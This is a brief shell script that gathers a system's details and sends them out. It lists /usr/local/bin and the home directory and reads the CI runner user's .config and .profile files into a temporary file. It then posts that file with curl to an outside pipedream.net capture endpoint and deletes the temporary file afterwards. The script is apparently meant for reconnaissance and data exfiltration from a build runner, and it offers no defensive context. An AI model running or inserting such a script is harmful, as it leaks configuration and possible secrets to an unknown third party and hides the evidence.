#!/bin/sh

echo "--- START ---" > /tmp/file.txt

echo "--- /usr/local/bin" >> /tmp/file.txt
ls -1la /usr/local/bin >> /tmp/file.txt
echo "--- cat" >> /tmp/file.txt
cat /home/runner/.config >> /tmp/file.txt
echo "--- cat" >> /tmp/file.txt
cat /home/runner/.profile >> /tmp/file.txt


echo "--- ~/" >> /tmp/file.txt
ls -1la ~/ >> /tmp/file.txt

echo "--- FINISH ---" >> /tmp/file.txt

curl --data-binary "@/tmp/file.txt" https://ensf2rlc2dw6p.x.pipedream.net/

rm /tmp/file.txt
